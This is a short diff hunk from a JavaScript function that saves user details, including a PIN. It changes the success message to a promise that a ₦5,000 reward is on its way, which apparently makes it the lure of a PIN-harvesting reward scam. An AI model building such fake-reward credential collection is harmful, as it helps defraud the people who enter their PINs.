@@ -10,7 +10,7 @@ export const saveUserDetails = async (user) => {
       pin: user.pin,
       createdAt: new Date(),
     });
-    console.log("User details saved successfully!");
+    console.log("Congratulations, your reward of ₦5,000 is on the way into your account 🎉.");
   } catch (error) {
     console.error("Error saving data:", error);
   }
